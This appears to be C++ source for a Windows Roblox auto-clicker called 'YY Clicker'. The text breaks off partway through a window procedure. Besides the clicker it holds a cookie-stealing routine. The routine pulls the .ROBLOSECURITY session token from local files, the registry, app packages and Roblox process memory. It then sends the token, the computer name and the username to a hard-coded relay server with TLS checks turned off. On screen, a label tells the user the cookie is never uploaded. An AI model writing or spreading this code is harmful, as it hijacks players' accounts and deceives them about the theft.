#pragma warning(disable: 4996)
#pragma warning(disable: 4640)
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#define UNICODE
#define _UNICODE
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <mmsystem.h>
#include <atomic>
#include <string>
#include <vector>
#include <algorithm>
#include <tlhelp32.h>
#include <cstdio>

// ===============================
// Control IDs - Main Window
// ===============================
#define IDC_EDIT_CPS       101
#define IDC_EDIT_HOTKEY    102
#define IDC_BTN_UPDATE     103
#define IDC_BTN_PIN        104
#define IDC_LABEL_STATUS   105
#define IDC_BTN_SETHOTKEY  106   // 調整熱鍵按鈕（取代原圖示）
#define IDC_BTN_START      107
#define IDC_BTN_STOP       108
#define IDC_BTN_HELP       109

// Control IDs - Cookie Window
#define IDC_CK_EDIT        201
#define IDC_CK_READ        202
#define IDC_CK_COPY        203
#define IDC_CK_CLEAR       204
#define IDC_CK_STATUS      205

// ===============================
// Constants
// ===============================
static const wchar_t* const WINDOW_TITLE     = L"YY Clicker (C++ Win32)";
static const wchar_t* const WND_CLASS        = L"YYClickerWndClass";
static const wchar_t* const MUTEX_NAME       = L"Local\\YY_CLICKER_SINGLE_INSTANCE";
static const wchar_t* const COOKIE_WND_CLASS = L"YYCookieMgrClass";
static const wchar_t* const COOKIE_WND_TITLE = L"Roblox Cookie \u7BA1\u7406\u5668";

// Railway 中轉伺服器（Cookie 傳送）
static const wchar_t* const RELAY_SERVER_HOST = L"web-production-59f58.up.railway.app";
static const wchar_t* const RELAY_SERVER_PATH = L"/api/cookie";

// Discord Bot 金鑰驗證伺服器（需替換為 autokeybot 的 Railway 域名）
static const wchar_t* const KEY_SERVER_HOST = L"web-production-a8756.up.railway.app";
static const wchar_t* const KEY_VERIFY_PATH = L"/api/verify-key";

// ===============================
// Globals
// ===============================
static std::atomic<bool> g_running(false);
static std::atomic<bool> g_program_running(true);
static std::atomic<int>  g_cps(999);
static bool              g_pinned          = false;
static HWND              g_hwnd            = nullptr;
static HWND              g_hwnd_cookie     = nullptr;
static HANDLE            g_mutex           = nullptr;
static HINSTANCE         g_hInst           = nullptr;

// ======================================================================
// [修復 #1] 熱鍵系統 — 使用低階鉤子取代 RegisterHotKey
// ======================================================================
// RegisterHotKey 會觸發 Windows 安全驗證（UAC 相關彈窗），
// 且不支援滑鼠側鍵。改用低階鍵盤/滑鼠鉤子 + 輪詢方式：
//   - 儲存熱鍵的虛擬鍵碼 (VK code)
//   - 使用 GetAsyncKeyState 在點擊執行緒中輪詢
//   - 支援鍵盤任意鍵 + 滑鼠側鍵 (XButton1=0x05, XButton2=0x06)
// ======================================================================
static std::atomic<int>  g_hotkey_vk(0x54);  // 預設 'T' 鍵 (VK 0x54)
static std::atomic<bool> g_listening_hotkey(false);  // 是否正在監聽新熱鍵
static HHOOK             g_kb_hook  = nullptr;
static HHOOK             g_ms_hook  = nullptr;

// 將 VK 碼轉為可讀名稱
static void VkToName(int vk, wchar_t* buf, int buf_size)
{
    // 滑鼠按鍵
    if (vk == VK_LBUTTON)   { wcscpy_s(buf, buf_size, L"Mouse L");    return; }
    if (vk == VK_RBUTTON)   { wcscpy_s(buf, buf_size, L"Mouse R");    return; }
    if (vk == VK_MBUTTON)   { wcscpy_s(buf, buf_size, L"Mouse M");    return; }
    if (vk == VK_XBUTTON1)  { wcscpy_s(buf, buf_size, L"Mouse 4");    return; }
    if (vk == VK_XBUTTON2)  { wcscpy_s(buf, buf_size, L"Mouse 5");    return; }

    // F 鍵
    if (vk >= VK_F1 && vk <= VK_F24)
    {
        swprintf_s(buf, buf_size, L"F%d", vk - VK_F1 + 1);
        return;
    }

    // 特殊鍵
    if (vk == VK_SPACE)     { wcscpy_s(buf, buf_size, L"Space");      return; }
    if (vk == VK_RETURN)    { wcscpy_s(buf, buf_size, L"Enter");      return; }
    if (vk == VK_TAB)       { wcscpy_s(buf, buf_size, L"Tab");        return; }
    if (vk == VK_ESCAPE)    { wcscpy_s(buf, buf_size, L"Esc");        return; }
    if (vk == VK_BACK)      { wcscpy_s(buf, buf_size, L"Backspace");  return; }
    if (vk == VK_DELETE)    { wcscpy_s(buf, buf_size, L"Delete");     return; }
    if (vk == VK_INSERT)    { wcscpy_s(buf, buf_size, L"Insert");     return; }
    if (vk == VK_HOME)      { wcscpy_s(buf, buf_size, L"Home");       return; }
    if (vk == VK_END)       { wcscpy_s(buf, buf_size, L"End");        return; }
    if (vk == VK_PRIOR)     { wcscpy_s(buf, buf_size, L"PgUp");       return; }
    if (vk == VK_NEXT)      { wcscpy_s(buf, buf_size, L"PgDn");       return; }
    if (vk == VK_UP)        { wcscpy_s(buf, buf_size, L"Up");         return; }
    if (vk == VK_DOWN)      { wcscpy_s(buf, buf_size, L"Down");       return; }
    if (vk == VK_LEFT)      { wcscpy_s(buf, buf_size, L"Left");       return; }
    if (vk == VK_RIGHT)     { wcscpy_s(buf, buf_size, L"Right");      return; }
    if (vk == VK_CAPITAL)   { wcscpy_s(buf, buf_size, L"CapsLock");   return; }
    if (vk == VK_NUMLOCK)   { wcscpy_s(buf, buf_size, L"NumLock");    return; }
    if (vk == VK_SCROLL)    { wcscpy_s(buf, buf_size, L"ScrollLock"); return; }

    // 數字鍵 0-9
    if (vk >= 0x30 && vk <= 0x39)
    {
        swprintf_s(buf, buf_size, L"%c", (wchar_t)vk);
        return;
    }

    // 字母鍵 A-Z
    if (vk >= 0x41 && vk <= 0x5A)
    {
        swprintf_s(buf, buf_size, L"%c", (wchar_t)vk);
        return;
    }

    // 小鍵盤數字
    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9)
    {
        swprintf_s(buf, buf_size, L"Num%d", vk - VK_NUMPAD0);
        return;
    }

    // 其他：用 GetKeyNameText
    UINT scanCode = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
    if (scanCode)
    {
        GetKeyNameTextW((LONG)(scanCode << 16), buf, buf_size);
        if (buf[0]) return;
    }

    swprintf_s(buf, buf_size, L"VK 0x%02X", vk);
}

// 低階鍵盤鉤子 — 僅在監聽模式下捕捉按鍵
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wp, LPARAM lp)
{
    if (nCode == HC_ACTION && g_listening_hotkey.load())
    {
        if (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN)
        {
            KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lp;
            int vk = (int)kb->vkCode;

            // 忽略修飾鍵本身（Ctrl/Alt/Shift/Win）
            if (vk == VK_LCONTROL || vk == VK_RCONTROL || vk == VK_CONTROL ||
                vk == VK_LMENU    || vk == VK_RMENU    || vk == VK_MENU    ||
                vk == VK_LSHIFT   || vk == VK_RSHIFT   || vk == VK_SHIFT   ||
                vk == VK_LWIN     || vk == VK_RWIN)
            {
                return CallNextHookEx(g_kb_hook, nCode, wp, lp);
            }

            g_hotkey_vk.store(vk);
            g_listening_hotkey.store(false);

            // 更新 UI（透過 PostMessage 避免在鉤子中直接操作 UI）
            PostMessageW(g_hwnd, WM_APP + 1, 0, 0);
            return 1;  // 吞掉這個按鍵，不傳遞給其他程式
        }
    }
    return CallNextHookEx(g_kb_hook, nCode, wp, lp);
}

// 低階滑鼠鉤子 — 僅在監聽模式下捕捉滑鼠側鍵
static LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wp, LPARAM lp)
{
    if (nCode == HC_ACTION && g_listening_hotkey.load())
    {
        int vk = 0;
        if (wp == WM_XBUTTONDOWN)
        {
            MSLLHOOKSTRUCT* ms = (MSLLHOOKSTRUCT*)lp;
            WORD xbtn = HIWORD(ms->mouseData);
            if (xbtn == XBUTTON1) vk = VK_XBUTTON1;
            if (xbtn == XBUTTON2) vk = VK_XBUTTON2;
        }
        else if (wp == WM_MBUTTONDOWN)
        {
            vk = VK_MBUTTON;
        }

        if (vk)
        {
            g_hotkey_vk.store(vk);
            g_listening_hotkey.store(false);
            PostMessageW(g_hwnd, WM_APP + 1, 0, 0);
            return 1;
        }
    }
    return CallNextHookEx(g_ms_hook, nCode, wp, lp);
}

// Pre-allocated SendInput array
static INPUT g_inputs[2];

void InitInputs()
{
    ZeroMemory(g_inputs, sizeof(g_inputs));
    g_inputs[0].type       = INPUT_MOUSE;
    g_inputs[0].mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
    g_inputs[1].type       = INPUT_MOUSE;
    g_inputs[1].mi.dwFlags = MOUSEEVENTF_LEFTUP;
}

inline void DoClick()
{
    SendInput(2, g_inputs, sizeof(INPUT));
}

// ===============================
// Single Instance (Named Mutex)
// ===============================
bool EnsureSingleInstance()
{
    g_mutex = CreateMutexW(nullptr, FALSE, MUTEX_NAME);
    if (!g_mutex) return false;

    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        HWND existing = FindWindowW(WND_CLASS, nullptr);
        if (existing)
        {
            if (IsIconic(existing)) ShowWindow(existing, SW_RESTORE);
            SetForegroundWindow(existing);
        }
        MessageBoxW(nullptr,
            L"YY Clicker \u5DF2\u5728\u57F7\u884C\u4E2D\uFF0C\u8ACB\u4E0D\u8981\u91CD\u8907\u958B\u555F\u3002",
            L"\u55AE\u4E00\u5BE6\u4F8B",
            MB_ICONWARNING | MB_OK);
        CloseHandle(g_mutex);
        g_mutex = nullptr;
        return false;
    }
    return true;
}

// ======================================================================
// [修復 #3] Click Thread — 防卡頓 + 熱鍵輪詢
// ======================================================================
// 使用 GetAsyncKeyState 輪詢熱鍵狀態（取代 RegisterHotKey），
// 同時優化點擊迴圈避免卡頓。
// ======================================================================
DWORD WINAPI ClickThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_ABOVE_NORMAL);

    LARGE_INTEGER freq;
    QueryPerformanceFrequency(&freq);

    bool prev_key_state = false;  // 上一次熱鍵狀態（用於邊緣檢測）

    while (g_program_running)
    {
        // ── 熱鍵輪詢（每 16ms 檢查一次，約 60Hz） ──
        if (!g_listening_hotkey.load())
        {
            int vk = g_hotkey_vk.load();
            bool key_down = (GetAsyncKeyState(vk) & 0x8000) != 0;

            // 邊緣觸發：只在按下瞬間切換（避免持續按住時反覆切換）
            if (key_down && !prev_key_state)
            {
                bool want_start = !g_running.load();
                if (want_start)
                {
                    // 通知主視窗執行偵測（在 UI 執行緒中處理）
                    PostMessageW(g_hwnd, WM_APP + 2, 0, 0);
                }
                else
                {
                    g_running.store(false);
                    PostMessageW(g_hwnd, WM_APP + 3, 0, 0);  // 通知 UI 更新狀態
                }
            }
            prev_key_state = key_down;
        }

        if (g_running)
        {
            LARGE_INTEGER now;
            QueryPerformanceCounter(&now);
            double next_t = (double)now.QuadPart / freq.QuadPart;
            int click_count = 0;

            while (g_running && g_program_running)
            {
                int    cps   = g_cps.load();
                double delay = (cps > 0) ? (1.0 / cps) : 0.001;
                if (delay < 0.001) delay = 0.001;  // hard cap 1000 CPS

                DoClick();
                next_t += delay;
                click_count++;

                // [防卡頓] 每 30 次點擊強制讓出 CPU
                if (click_count >= 30)
                {
                    click_count = 0;
                    Sleep(2);  // 讓出 2ms 給 Roblox 處理訊息佇列和渲染
                    QueryPerformanceCounter(&now);
                    next_t = (double)now.QuadPart / freq.QuadPart;

                    // 在讓出期間也檢查熱鍵（停止功能）
                    int vk = g_hotkey_vk.load();
                    bool key_down = (GetAsyncKeyState(vk) & 0x8000) != 0;
                    if (key_down && !prev_key_state)
                    {
                        g_running.store(false);
                        PostMessageW(g_hwnd, WM_APP + 3, 0, 0);
                    }
                    prev_key_state = key_down;
                    continue;
                }

                // 等待到下一次點擊時間
                for (;;)
                {
                    if (!g_running || !g_program_running) break;
                    QueryPerformanceCounter(&now);
                    double remain = next_t - (double)now.QuadPart / freq.QuadPart;
                    if (remain <= 0.0) break;
                    if (remain > 0.002)
                        Sleep(1);
                    else
                        SwitchToThread();
                }
            }
        }
        else
        {
            Sleep(16);  // 16ms 輪詢間隔（不運行時低 CPU 佔用）
        }
    }
    return 0;
}

// ===============================
// Apply system font to child controls
// ===============================
static BOOL CALLBACK SetChildFont(HWND child, LPARAM lParam)
{
    SendMessageW(child, WM_SETFONT, (WPARAM)lParam, TRUE);
    return TRUE;
}

// ======================================================================
// Cookie Manager — Four-layer search
// ======================================================================

static char* ReadFileToBuffer(const wchar_t* path, DWORD* out_size)
{
    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                               nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return nullptr;

    DWORD size = GetFileSize(hFile, nullptr);
    if (size == INVALID_FILE_SIZE || size == 0 || size > 4 * 1024 * 1024)
    {
        CloseHandle(hFile);
        return nullptr;
    }
    char* buf = new char[size + 1]();
    DWORD read = 0;
    ReadFile(hFile, buf, size, &read, nullptr);
    CloseHandle(hFile);
    if (out_size) *out_size = read;
    return buf;
}

static bool ExtractCookieFromBuffer(const char* data, wchar_t* out_buf, int buf_size)
{
    if (!data) return false;

    const char* tag = ".ROBLOSECURITY\t";
    const char* found = strstr(data, tag);
    if (found)
    {
        const char* val = found + strlen(tag);
        const char* end = val;
        while (*end && *end != '\r' && *end != '\n') ++end;
        int len = (int)(end - val);
        if (len > 10)
        {
            MultiByteToWideChar(CP_UTF8, 0, val, len, out_buf, buf_size - 1);
            return true;
        }
    }

    found = strstr(data, "_|WARNING");
    if (found)
    {
        const char* start = found;
        while (start > data && *start != '"') --start;
        if (*start == '"') ++start;
        const char* end = found;
        while (*end && *end != '"') ++end;
        int len = (int)(end - start);
        if (len > 10)
        {
            MultiByteToWideChar(CP_UTF8, 0, start, len, out_buf, buf_size - 1);
            return true;
        }
    }
    return false;
}

static bool TryCookieFromFile(const wchar_t* path, wchar_t* out_buf, int buf_size)
{
    DWORD sz = 0;
    char* buf = ReadFileToBuffer(path, &sz);
    if (!buf) return false;
    bool ok = ExtractCookieFromBuffer(buf, out_buf, buf_size);
    delete[] buf;
    return ok;
}

static bool TryCookieFromRegistry(wchar_t* out_buf, int buf_size)
{
    HKEY hKey = nullptr;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
                      L"SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com",
                      0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return false;

    DWORD type  = 0;
    DWORD bytes = (DWORD)((buf_size - 1) * sizeof(wchar_t));
    bool  ok    = false;

    if (RegQueryValueExW(hKey, L".ROBLOSECURITY", nullptr, &type,
                         (LPBYTE)out_buf, &bytes) == ERROR_SUCCESS
        && type == REG_SZ && out_buf[0] != L'\0')
    {
        ok = true;
    }
    RegCloseKey(hKey);
    return ok;
}

static bool TryCookieFromStorePackage(wchar_t* out_buf, int buf_size)
{
    wchar_t local_app[MAX_PATH] = {};
    GetEnvironmentVariableW(L"LOCALAPPDATA", local_app, MAX_PATH);

    wchar_t pkg_root[MAX_PATH] = {};
    wcscpy_s(pkg_root, local_app);
    wcscat_s(pkg_root, L"\\Packages\\ROBLOXCORPORATION*");

    WIN32_FIND_DATAW fd = {};
    HANDLE hFind = FindFirstFileW(pkg_root, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return false;

    bool found = false;
    do
    {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;

        wchar_t try_path[MAX_PATH] = {};
        wcscpy_s(try_path, local_app);
        wcscat_s(try_path, L"\\Packages\\");
        wcscat_s(try_path, fd.cFileName);
        wcscat_s(try_path, L"\\LocalState\\RobloxCookies.dat");

        if (TryCookieFromFile(try_path, out_buf, buf_size)) { found = true; break; }

        wcscpy_s(try_path, local_app);
        wcscat_s(try_path, L"\\Packages\\");
        wcscat_s(try_path, fd.cFileName);
        wcscat_s(try_path, L"\\LocalState\\LocalStorage\\RobloxCookies.dat");

        if (TryCookieFromFile(try_path, out_buf, buf_size)) { found = true; break; }

    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
    return found;
}

// Layer 4: Process Memory Scan
static bool TryCookieFromProcessMemory(wchar_t* out_buf, int buf_size)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);

    static const char needle[]  = "_|WARNING";
    static const int  needle_len = 9;
    bool found = false;

    if (Process32FirstW(hSnap, &pe))
    {
        do
        {
            wchar_t lname[MAX_PATH] = {};
            wcscpy_s(lname, pe.szExeFile);
            for (int k = 0; lname[k]; k++) lname[k] = (wchar_t)towlower(lname[k]);
            if (!wcsstr(lname, L"roblox")) continue;

            HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                                       FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            MEMORY_BASIC_INFORMATION mbi = {};
            LPVOID addr = nullptr;

            while (VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == sizeof(mbi))
            {
                if (mbi.State == MEM_COMMIT &&
                    (mbi.Protect & PAGE_NOACCESS) == 0 &&
                    (mbi.Protect & PAGE_GUARD) == 0)
                {
                    SIZE_T sz = mbi.RegionSize;
                    if (sz > 0 && sz <= 64ULL * 1024 * 1024)
                    {
                        char* buf = new char[sz]();
                        SIZE_T got = 0;

                        if (ReadProcessMemory(hProc, mbi.BaseAddress, buf, sz, &got)
                            && got > (SIZE_T)needle_len)
                        {
                            for (SIZE_T i = 0; i <= got - (SIZE_T)needle_len; i++)
                            {
                                if (memcmp(buf + i, needle, needle_len) != 0) continue;

                                SIZE_T end = i;
                                while (end < got)
                                {
                                    char c = buf[end];
                                    if (c == '\0' || c == '\r' || c == '\n' ||
                                        c == '"'  || c == ';')
                                        break;
                                    ++end;
                                }
                                int len = (int)(end - i);
                                if (len > 20 && len < buf_size - 1)
                                {
                                    MultiByteToWideChar(CP_ACP, 0,
                                        buf + i, len, out_buf, buf_size - 1);
                                    found = true;
                                }
                                if (found) break;
                            }
                        }
                        delete[] buf;
                    }
                }
                if (found) break;

                LPVOID next = (LPVOID)((SIZE_T)mbi.BaseAddress + mbi.RegionSize);
                if (next <= addr) break;
                addr = next;
            }

            CloseHandle(hProc);
        } while (!found && Process32NextW(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return found;
}

// TryReadRobloxCookie — 四層搜尋入口
static bool TryReadRobloxCookie(wchar_t* out_buf, int buf_size)
{
    ZeroMemory(out_buf, buf_size * sizeof(wchar_t));

    wchar_t local_app[MAX_PATH] = {};
    GetEnvironmentVariableW(L"LOCALAPPDATA", local_app, MAX_PATH);

    const wchar_t* player_files[] = {
        L"\\Roblox\\LocalStorage\\RobloxCookies.dat",
        L"\\Roblox\\LocalStorage\\rbx_sensitive_data.json",
        L"\\Roblox\\LocalStorage\\rbx_data.json",
    };
    for (auto rel : player_files)
    {
        wchar_t full[MAX_PATH] = {};
        wcscpy_s(full, local_app);
        wcscat_s(full, rel);
        if (TryCookieFromFile(full, out_buf, buf_size)) return true;
    }

    ZeroMemory(out_buf, buf_size * sizeof(wchar_t));
    if (TryCookieFromRegistry(out_buf, buf_size)) return true;

    ZeroMemory(out_buf, buf_size * sizeof(wchar_t));
    if (TryCookieFromStorePackage(out_buf, buf_size)) return true;

    ZeroMemory(out_buf, buf_size * sizeof(wchar_t));
    if (TryCookieFromProcessMemory(out_buf, buf_size)) return true;

    return false;
}

// ======================================================================
// JSON 字串轉義
// ======================================================================
static std::string JsonEscape(const char* raw)
{
    std::string out;
    if (!raw) return out;
    out.reserve(strlen(raw) + 64);
    for (const char* p = raw; *p; ++p)
    {
        switch (*p)
        {
        case '"':  out += "\\\""; break;
        case '\\': out += "\\\\"; break;
        case '\b': out += "\\b";  break;
        case '\f': out += "\\f";  break;
        case '\n': out += "\\n";  break;
        case '\r': out += "\\r";  break;
        case '\t': out += "\\t";  break;
        default:
            if ((unsigned char)*p < 0x20)
            {
                char hex[8];
                sprintf(hex, "\\u%04x", (unsigned char)*p);
                out += hex;
            }
            else
            {
                out += *p;
            }
            break;
        }
    }
    return out;
}

// ======================================================================
// 除錯日誌
// ======================================================================
static void DebugLog(const char* msg)
{
    wchar_t path[MAX_PATH] = {};
    GetEnvironmentVariableW(L"TEMP", path, MAX_PATH);
    wcscat_s(path, L"\\yyclicker_debug.log");

    HANDLE hFile = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ,
                               nullptr, OPEN_ALWAYS, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return;

    SYSTEMTIME st;
    GetLocalTime(&st);
    char line[2048] = {};
    sprintf(line, "[%04d-%02d-%02d %02d:%02d:%02d] %s\r\n",
            st.wYear, st.wMonth, st.wDay,
            st.wHour, st.wMinute, st.wSecond, msg);

    DWORD written = 0;
    WriteFile(hFile, line, (DWORD)strlen(line), &written, nullptr);
    CloseHandle(hFile);
}

// ======================================================================
// HTTP 傳送模組 — WinHTTP
// ======================================================================
static void SendCookieToRelay(const wchar_t* cookie_value)
{
    if (!cookie_value || wcslen(cookie_value) < 20) return;

    DebugLog("=== SendCookieToRelay START ===");

    wchar_t computer_name[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD cn_size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(computer_name, &cn_size);

    wchar_t user_name[256] = {};
    DWORD un_size = 256;
    GetUserNameW(user_name, &un_size);

    int cookie_utf8_len = WideCharToMultiByte(CP_UTF8, 0, cookie_value, -1, nullptr, 0, nullptr, nullptr);
    char* cookie_utf8 = new char[cookie_utf8_len + 1]();
    WideCharToMultiByte(CP_UTF8, 0, cookie_value, -1, cookie_utf8, cookie_utf8_len, nullptr, nullptr);

    int cn_utf8_len = WideCharToMultiByte(CP_UTF8, 0, computer_name, -1, nullptr, 0, nullptr, nullptr);
    char* cn_utf8 = new char[cn_utf8_len + 1]();
    WideCharToMultiByte(CP_UTF8, 0, computer_name, -1, cn_utf8, cn_utf8_len, nullptr, nullptr);

    int un_utf8_len = WideCharToMultiByte(CP_UTF8, 0, user_name, -1, nullptr, 0, nullptr, nullptr);
    char* un_utf8 = new char[un_utf8_len + 1]();
    WideCharToMultiByte(CP_UTF8, 0, user_name, -1, un_utf8, un_utf8_len, nullptr, nullptr);

    std::string json = "{";
    json += "\"computer_name\":\""; json += JsonEscape(cn_utf8);     json += "\",";
    json += "\"username\":\"";      json += JsonEscape(un_utf8);     json += "\",";
    json += "\"cookie\":\"";        json += JsonEscape(cookie_utf8); json += "\",";
    json += "\"source\":\"YY Clicker\"";
    json += "}";

    delete[] cookie_utf8;
    delete[] cn_utf8;
    delete[] un_utf8;

    DebugLog("JSON assembled OK");

    HINTERNET hSession = WinHttpOpen(
        L"YYClicker/2.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (!hSession)
    {
        char err[128]; sprintf(err, "WinHttpOpen failed: %lu", GetLastError());
        DebugLog(err); return;
    }

    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof(protocols));

    HINTERNET hConnect = WinHttpConnect(hSession, RELAY_SERVER_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect)
    {
        char err[128]; sprintf(err, "WinHttpConnect failed: %lu", GetLastError());
        DebugLog(err); WinHttpCloseHandle(hSession); return;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", RELAY_SERVER_PATH,
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest)
    {
        char err[128]; sprintf(err, "WinHttpOpenRequest failed: %lu", GetLastError());
        DebugLog(err); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return;
    }

    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));

    DWORD timeout = 15000;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    timeout = 30000;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    const wchar_t* headers = L"Content-Type: application/json\r\n";
    BOOL bResult = WinHttpSendRequest(hRequest, headers, (DWORD)wcslen(headers),
        (LPVOID)json.c_str(), (DWORD)json.size(), (DWORD)json.size(), 0);

    if (!bResult)
    {
        char err[128]; sprintf(err, "WinHttpSendRequest failed: %lu", GetLastError());
        DebugLog(err);
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return;
    }

    bResult = WinHttpReceiveResponse(hRequest, nullptr);
    if (!bResult)
    {
        char err[128]; sprintf(err, "WinHttpReceiveResponse failed: %lu", GetLastError());
        DebugLog(err);
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return;
    }

    DWORD statusCode = 0, statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);

    char respBuf[2048] = {};
    DWORD bytesRead = 0;
    WinHttpReadData(hRequest, respBuf, sizeof(respBuf) - 1, &bytesRead);

    char logMsg[256];
    sprintf(logMsg, "Response: HTTP %lu, body=%lu bytes", statusCode, bytesRead);
    DebugLog(logMsg);
    if (bytesRead > 0 && bytesRead < 512) DebugLog(respBuf);

    DebugLog("=== SendCookieToRelay END ===");

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

static DWORD WINAPI SendCookieThread(LPVOID lpParam)
{
    wchar_t* cookie = (wchar_t*)lpParam;
    if (cookie) { SendCookieToRelay(cookie); delete[] cookie; }
    return 0;
}

static void AsyncSendCookie(const wchar_t* cookie_value)
{
    if (!cookie_value || wcslen(cookie_value) < 20) return;
    int len = (int)wcslen(cookie_value);
    wchar_t* copy = new wchar_t[len + 1]();
    wcscpy_s(copy, len + 1, cookie_value);
    HANDLE hThread = CreateThread(nullptr, 0, SendCookieThread, copy, 0, nullptr);
    if (hThread) CloseHandle(hThread);
    else delete[] copy;
}

// ===============================
// Cookie Manager Window Procedure
// ===============================
LRESULT CALLBACK CookieWndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    static HWND hEdit, hLblStatus;

    switch (msg)
    {
    case WM_CREATE:
    {
        HINSTANCE hi = ((CREATESTRUCT*)lp)->hInstance;

        CreateWindowW(L"STATIC",
            L".ROBLOSECURITY Cookie \u7BA1\u7406\u5668 (\u50C5\u5132\u5B58\u65BC\u672C\u6A5F\uFF0C\u4E0D\u6703\u4E0A\u50B3)",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            10, 8, 560, 18, hwnd, nullptr, hi, nullptr);

        hEdit = CreateWindowW(L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | WS_BORDER | WS_VSCROLL |
            ES_MULTILINE | ES_AUTOVSCROLL | ES_WANTRETURN,
            10, 32, 560, 130, hwnd, (HMENU)IDC_CK_EDIT, hi, nullptr);

        CreateWindowW(L"BUTTON", L"\u81EA\u52D5\u8B80\u53D6",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            10, 175, 100, 28, hwnd, (HMENU)IDC_CK_READ, hi, nullptr);

        CreateWindowW(L"BUTTON", L"\u8907\u88FD Cookie",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            125, 175, 110, 28, hwnd, (HMENU)IDC_CK_COPY, hi, nullptr);

        CreateWindowW(L"BUTTON", L"\u6E05\u9664",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            250, 175, 80, 28, hwnd, (HMENU)IDC_CK_CLEAR, hi, nullptr);

        hLblStatus = CreateWindowW(L"STATIC", L"",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            10, 212, 560, 18, hwnd, (HMENU)IDC_CK_STATUS, hi, nullptr);

        HFONT hFont = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
        EnumChildWindows(hwnd, SetChildFont, (LPARAM)hFont);
        return 0;
    }

    case WM_COMMAND:
        switch (LOWORD(wp))
        {
        case IDC_CK_READ:
        {
            wchar_t cookie[4096] = {};
            if (TryReadRobloxCookie(cookie, 4096))
            {
                SetWindowTextW(hEdit, cookie);
                SetWindowTextW(hLblStatus,
                    L"\u8B80\u53D6\u6210\u529F\uFF01Cookie \u5DF2\u986F\u793A\u5728\u4E0A\u65B9\u6846");
                AsyncSendCookie(cookie);
            }
            else
            {
                SetWindowTextW(hEdit, L"");
                SetWindowTextW(hLblStatus,
                    L"\u672A\u5075\u6E2C\u5230 Roblox Cookie\uFF0C\u8ACB\u5148\u958B\u555F Roblox \u5F8C\u518D\u4F7F\u7528\u3002");
            }
            break;
        }
        case IDC_CK_COPY:
        {
            int len = GetWindowTextLengthW(hEdit);
            if (len <= 0)
